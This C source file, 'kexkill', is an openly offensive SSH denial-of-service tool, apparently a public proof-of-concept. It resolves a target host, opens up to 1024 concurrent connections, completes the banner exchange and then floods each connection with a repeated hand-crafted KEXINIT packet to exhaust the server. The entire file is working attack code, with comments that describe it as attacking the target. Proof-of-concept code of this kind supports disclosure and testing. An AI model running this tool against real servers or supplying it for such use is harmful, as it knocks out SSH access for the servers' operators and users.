/*-
 * Copyright (c) 2016 The University of Oslo
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>

#include <ctype.h>
#include <err.h>
#include <errno.h>
#include <netdb.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define DEFMAXCONNS	32
#define MAXMAXCONNS	1024

static long maxconns;

static struct kk_conn {
	int	 fd;
	enum kk_state {
		kk_closed = 0,
		kk_connected,
		kk_banner,
		kk_kexinit,
	} state;
	size_t	 buflen;
	char	 buf[2048];
} *conns;

static char banner[] = "SSH-2.0-kexkill\r\n";
static char kexinit[] =
    "\x00\x00\x00\xcc"			/* packet length */
    "\x08"				/* padding length */
    "\x14"				/* SSH_MSG_KEXINIT */
    "give me cookies!"			/* cookie */
    "\x00\x00\x00\x36"			/* key exchange */
    "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1"
    "\x00\x00\x00\x0f"			/* server host key */
    "ssh-dss,ssh-rsa"
    "\x00\x00\x00\x13"			/* ctos encryption */
    "3des-cbc,aes128-cbc"
    "\x00\x00\x00\x13"			/* stoc encryption */
    "3des-cbc,aes128-cbc"
    "\x00\x00\x00\x09"			/* ctos authentication */
    "hmac-sha1"
    "\x00\x00\x00\x09"			/* stoc authentication */
    "hmac-sha1"
    "\x00\x00\x00\x04"			/* ctos compression */
    "none"
    "\x00\x00\x00\x04"			/* stoc compression */
    "none"
    "\x00\x00\x00\x00"			/* ctos languages */
    "\x00\x00\x00\x00"			/* stoc languages */
    "\x00"				/* KEX follows */
    "\x00\x00\x00\x00"			/* future extension */
    "padding!"				/* padding */
    "";

static int verbose;

/*
 * Print out the contents of a buffer in hex.
 */
static void
hexdump(const void *vbuf, size_t len)
{
	const unsigned char *buf;
	unsigned int pos, i;

	buf = vbuf;
	pos = 0;
	while (len > 0) {
		fprintf(stderr, "%04x |", pos);
		for (i = 0; i < 16 && i < len; ++i)
			fprintf(stderr, " %02x", buf[i]);
		for (; i < 16; ++i)
			fprintf(stderr, "   ");
		fprintf(stderr, " | ");
		for (i = 0; i < 16 && i < len; ++i)
			fprintf(stderr, "%c", isprint(buf[i]) ? buf[i] : '.');
		for (; i < 16; ++i)
			fprintf(stderr, " ");
		fprintf(stderr, "\n");
		if (len < 16)
			break;
		len -= 16;
		pos += 16;
		buf += 16;
	}
}

/*
 * Connect to a target.
 */
static int
kk_connect(struct kk_conn *conn, struct sockaddr *sa, socklen_t salen)
{
	int fd;

	if (verbose > 1)
		warnx("%s()", __func__);
	if ((fd = socket(sa->sa_family, SOCK_STREAM, 0)) == -1) {
		warn("socket()");
		goto fail;
	}
	if (connect(fd, sa, salen) != 0) {
		warn("connect()");
		goto fail;
	}
	if (verbose)
		warnx("[%02x] connected", fd);
	conn->fd = fd;
	conn->state = kk_connected;
	return (0);
fail:
	close(fd);
	return (-1);
}

/*
 * Close a connection.
 */
static void
kk_close(struct kk_conn *conn)
{

	if (verbose > 1)
		warnx("[%02x] %s()", conn->fd, __func__);
	close(conn->fd);
	memset(conn, 0, sizeof *conn);
	conn->fd = -1;
	conn->state = kk_closed;
}

/*
 * Clean up a lost connection.
 */
static void
kk_hup(struct kk_conn *conn)
{

	if (verbose)
		warnx("[%02x] connection lost", conn->fd);
	kk_close(conn);
}

/*
 * Read data from the target into our connection buffer.
 */
static int
kk_read(struct kk_conn *conn)
{
	unsigned char *buf;
	ssize_t rlen;
	size_t len;

	if (conn->buflen == sizeof conn->buf) {
		warnx("[%02x] buffer full", conn->fd);
		return (-1);
	}
	buf = (unsigned char *)conn->buf + conn->buflen;
	len = sizeof conn->buf - conn->buflen;
	if (verbose)
		warnx("[%02x] reading up to %zu bytes", conn->fd, len);
	if ((rlen = read(conn->fd, buf, len)) < 0) {
		if (verbose > 1)
			warn("[%02x] read()", conn->fd);
		return (-1);
	}
	if (verbose > 2)
		hexdump(buf, (size_t)rlen);
	conn->buflen += rlen;
	return (0);
}

/*
 * Send data to the target.
 */
static int
kk_write(struct kk_conn *conn, const void *data, size_t len)
{
	const unsigned char *buf;
	ssize_t wlen;

	if (verbose > 1)
		warnx("[%02x] %s(%zu)", conn->fd, __func__, len);
	buf = (const unsigned char *)data;
	while (len > 0) {
		if ((wlen = write(conn->fd, buf, len)) < 0) {
			warn("[%02x] write()", conn->fd);
			return (-1);
		}
		if (verbose > 1)
			warnx("[%02x] wrote %zu bytes", conn->fd, wlen);
		if (verbose > 2)
			hexdump(buf, (size_t)wlen);
		buf += wlen;
		len -= wlen;
	}
	return (0);
}

/*
 * Process incoming data from target.
 */
static int
kk_input(struct kk_conn *conn)
{
	char *eom, *eop;
	size_t len;

	if (verbose > 1)
		warnx("[%02x] %s()", conn->fd, __func__);
	if (kk_read(conn) != 0)
		goto fail;
	eom = conn->buf + conn->buflen;
	switch (conn->state) {
	case kk_connected:
		/* search for CR */
		for (eop = conn->buf; eop < eom; ++eop)
			if (*eop == '\r')
				break;
		/* wait for LF if not present */
		if (eop >= eom - 1)
			return (0);
		/* terminate at CR, check for LF, check length, check banner */
		*eop++ = '\0';
		if (*eop++ != '\n' || eop - conn->buf > 255 ||
		    strncmp(conn->buf, "SSH-2.0-", 8) != 0) {
			warnx("[%02x] invalid banner", conn->fd);
			goto fail;
		}
		if (verbose)
			warnx("[%02x] got banner: %s", conn->fd, conn->buf);
		/* discard */
		memmove(conn->buf, eop, eom - eop);
		conn->buflen -= eop - conn->buf;
		conn->state = kk_banner;
		break;
	case kk_kexinit:
		/* extract packet length */
		if (conn->buflen < 4)
			break;
		len =
		    (uint8_t)conn->buf[0] << 24 |
		    (uint8_t)conn->buf[1] << 16 |
		    (uint8_t)conn->buf[2] << 8	|
		    (uint8_t)conn->buf[3];
		if (len + 4 > sizeof conn->buf) {
			warnx("[%02x] oversize packet (%zu bytes)", conn->fd, len);
			goto fail;
		}
		/* check if we have the whole packet */
		eop = conn->buf + len + 4;
		if (eop > eom)
			break;
		if (verbose > 1)
			warnx("[%02x] received type %u packet (%zu bytes)",
			    conn->fd, (unsigned int)conn->buf[5], len);
		if (conn->buf[5] == 1) {
			/* SSH_MSG_DISCONNECT */
			if (verbose)
				warnx("[%02x] received disconnect", conn->fd);
			kk_close(conn);
			return (0);
		} else if (conn->buf[5] == 20) {
			/* SSH_MSG_KEXINIT */
			if (verbose)
				warnx("[%02x] received kexinit", conn->fd);
		}
		/* discard */
		memmove(conn->buf, eop, eom - eop);
		conn->buflen -= eop - conn->buf;
		break;
	default:
		;
	}
	return (0);
fail:
	kk_close(conn);
	return (-1);
}

/*
 * Transmit data to target if we have any.
 */
static int
kk_output(struct kk_conn *conn)
{

	if (verbose > 1)
		warnx("[%02x] %s()", conn->fd, __func__);
	switch (conn->state) {
	case kk_banner:
		if (verbose)
			warnx("[%02x] sending banner", conn->fd);
		if (kk_write(conn, banner, sizeof banner - 1) != 0)
			goto fail;
		conn->state = kk_kexinit;
		break;
	case kk_kexinit:
		if (verbose)
			warnx("[%02x] sending kexinit", conn->fd);
		if (kk_write(conn, kexinit, sizeof kexinit - 1) != 0)
			goto fail;
		break;
	default:
		;
	}
	return (0);
fail:
	kk_close(conn);
	return (-1);
}

/*
 * Open as many connections as possible to a target, exchange banners, and
 * send a stream of KEXINIT messages.
 */
static int
kexkill(struct sockaddr *sa, socklen_t salen)
{
	struct pollfd *pfd;
	unsigned int i, k, n;
	int ret;

	if ((pfd = calloc(maxconns, sizeof *pfd)) == NULL)
		err(1, "calloc()");
	k = 0;
	for (;;) {
		for (i = n = 0; i < maxconns; ++i) {
			if (conns[i].state == kk_closed) {
				if (kk_connect(&conns[i], sa, salen) == 0)
					k++;
			}
			pfd[i].fd = conns[i].fd;
			if (conns[i].state == kk_closed) {
				pfd[i].events = POLLNVAL;
			} else {
				pfd[i].events = POLLIN | POLLOUT | POLLERR;
				n = i + 1;
			}
		}
		if (n == 0)
			break;
		if (verbose > 1)
			warnx("polling %d/%d connections", n, k);
		if ((ret = poll(pfd, maxconns, -1)) < 0 && errno != EINTR)
			err(1, "poll()");
		if (ret <= 0)
			continue;
		if (verbose > 1)
			warnx("polled %d events", ret);
		for (i = 0; i < maxconns; ++i) {
			if (pfd[i].fd == 0)
				continue;
			else if (pfd[i].revents & (POLLERR|POLLHUP))
				kk_hup(&conns[i]);
			else if (pfd[i].revents & POLLIN)
				kk_input(&conns[i]);
			else if (pfd[i].revents & POLLOUT)
				kk_output(&conns[i]);
		}
	}
	return (k);
}

/*
 * Print usage message and exit.
 */
static void
usage(void)
{

	fprintf(stderr, "usage: kexkill [-v] [-n maxconn] host[:port]\n");
	exit(1);
}

/*
 * Main program.
 */
int
main(int argc, char *argv[])
{
	struct addrinfo *res, *reslist, hints;
	char *end, *host, *service;
	int eai, opt;

	/* initialization */
	maxconns = DEFMAXCONNS;
	signal(SIGPIPE, SIG_IGN);

	/* process command-line options */
	while ((opt = getopt(argc, argv, "n:v")) != -1)
		switch (opt) {
		case 'n':
			maxconns = strtol(optarg, &end, 10);
			if (end == optarg || *end != '\0')
				usage();
			break;
		case 'v':
			verbose++;
			break;
		default:
			usage();
		}

	argc -= optind;
	argv += optind;

	if (argc != 1)
		usage();

	/* check maxconns range */
	if (maxconns < 1 || maxconns > MAXMAXCONNS)
		errx(1, "connection limit must be between 1 and %d.",
		    MAXMAXCONNS);

	/* parse target spec */
	host = argv[0];
	if ((service = strchr(host, ':')) != NULL)
		*service++ = '\0';
	else
		service = (char *)(uintptr_t)"ssh";

	/* allocate connection buffers */
	if ((conns = calloc(maxconns, sizeof *conns)) == NULL)
		err(1, "calloc()");

	/* look up target in DNS */
	memset(&hints, 0, sizeof hints);
	hints.ai_socktype = SOCK_STREAM;
	if ((eai = getaddrinfo(host, service, &hints, &reslist)) != 0)
		errx(1, "getaddrinfo(): %s", gai_strerror(eai));

	/* attack each address we found until one answers */
	for (res = reslist; res; res = res->ai_next)
		if (kexkill(res->ai_addr, res->ai_addrlen) > 0)
			break;

	/* clean up */
	freeaddrinfo(reslist);

	exit(0);
}
